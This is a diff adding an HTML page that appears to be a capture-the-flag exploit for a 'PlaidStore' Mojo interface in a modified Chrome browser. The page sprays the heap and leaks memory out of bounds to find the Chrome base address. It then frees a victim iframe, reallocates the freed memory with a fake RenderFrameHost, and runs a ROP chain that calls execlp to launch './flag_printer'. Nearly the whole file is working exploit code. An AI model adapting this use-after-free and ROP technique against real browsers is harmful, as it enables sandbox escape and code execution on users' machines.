@@ -1,0 +1,121 @@
+<!-- Copyright: Oran Avraham <contact@oranav.me> -->
+<html>
+<head>
+    <script src="/mojo/public/js/mojo_bindings.js"></script>
+    <script src="/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
+    <script>
+        function createIFrame() {
+            const html = `
+<head>
+    <script src="/mojo/public/js/mojo_bindings.js"><\/script>
+    <script src="/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"><\/script>
+    <script>
+        function createStore() {
+            let p = new blink.mojom.PlaidStorePtr();
+            Mojo.bindInterface(blink.mojom.PlaidStore.name,
+                mojo.makeRequest(p).handle, "context", true);
+            return p;
+        }
+    <\/script>
+<\/head>
+`;
+            let iframe = document.createElement("iframe");
+            document.body.appendChild(iframe);
+            let ret = new Promise((resolve, reject) => {
+                iframe.onload = () => {
+                    iframe.store = iframe.contentWindow.createStore();
+                    resolve(iframe);
+                };
+            });
+            iframe.contentWindow.document.open();
+            iframe.contentWindow.document.write(html);
+            iframe.contentWindow.document.close();
+            return ret;
+        }
+        function createStore() {
+            let p = new blink.mojom.PlaidStorePtr();
+            Mojo.bindInterface(blink.mojom.PlaidStore.name,
+                mojo.makeRequest(p).handle, "context", true);
+            return p;
+        }
+        async function pwn() {
+            const frameSize = 0xc28;
+            const spraySize = 0x1000;
+            const readerSize = 0x40;
+
+            allocator = createStore();
+
+            // Spray
+            let sprayData = Array(frameSize).fill(41);
+            for (let i = 0; i < spraySize; ++i)
+                await allocator.storeData("spray_" + i, sprayData);
+
+            // Create the reader
+            await allocator.storeData("reader", Array(readerSize).fill(30));
+
+            // Create victim iframe and read it
+            const victim = await createIFrame();
+            let byteData = new Uint8Array((await allocator.getData("reader", frameSize*1024)).data);
+            let bigintData = new BigUint64Array(byteData.buffer);
+            let victimOffset = bigintData.findIndex((x, i, a) => (x & 0xfffn) == 0x2f0n && a[i + 1] == 0xaaaaaaaa00000001n);
+            if (victimOffset == -1) return false;
+            console.log("offset: " + victimOffset);
+            // Initialize victim's IPC channel
+            await victim.store.getData("", 0);
+
+            const origVtable = bigintData[victimOffset];
+            const rfhBase = bigintData[victimOffset + 0x2f8/8] - 0x2f8n - 0x90n;
+            const pivot = 0x58a32f8n; // push rdi; pop rsp; pop rbp; ret
+            const execlp = 0x9efa840n;
+
+            console.log("RenderFrameHostImpl @ " + rfhBase.toString(16));
+            console.log("Self ref ptr @ " + (rfhBase + 0x2f8n).toString(16));
+            console.log("Let's go!");
+
+            const renderFrameHostVtableOffset = 167432944n;
+            const chromeBase = origVtable - renderFrameHostVtableOffset;
+            console.log("Chrome base @ " + chromeBase.toString(16));
+
+            const fakeRFH = new BigUint64Array(frameSize / 8).fill(0x41414141n);
+            const ropSpace = 0x200/8; // in qwords
+            const fakeVtable = rfhBase + BigInt(8*ropSpace);
+
+            const rop = [
+                chromeBase + 0x2e4630fn, // pop rdi
+                rfhBase + BigInt(8*ropSpace), // ptr to "./flag_printer"
+                chromeBase + 0x00000000045419f9n, // xor esi, esi
+                chromeBase + execlp
+            ];
+
+            fakeRFH[0] = fakeVtable; // Fake vtable ptr -- points to &fakeRFH[ropSpace]
+            for (let i = 0; i < rop.length; ++i)
+                fakeRFH[1 + i] = rop[i];
+            // "./flag_printer"
+            fakeRFH[ropSpace] = 0x705f67616c662f2en;
+            fakeRFH[ropSpace + 1] = 0x7265746e6972n;
+            fakeRFH[ropSpace + 0x160/8] = chromeBase + pivot; // Fake vtable entry to be called upon UaF
+            const fakeRFHBytes = new Uint8Array(fakeRFH.buffer);
+
+            // Destroy the victim frames
+            victim.remove();
+
+            // Allocate over victim
+            for (let i = 0; i < 10240; ++i)
+                await allocator.storeData("o_" + i, fakeRFHBytes);
+
+            // Trigger
+            await victim.store.storeData("", []);
+            return true;
+        };
+    </script>
+</head>
+<body>
+    <script>
+        (async function () {
+            if (!await pwn()) {
+                location.reload();
+            }
+        })();
+    </script>
+</body>
+</html>
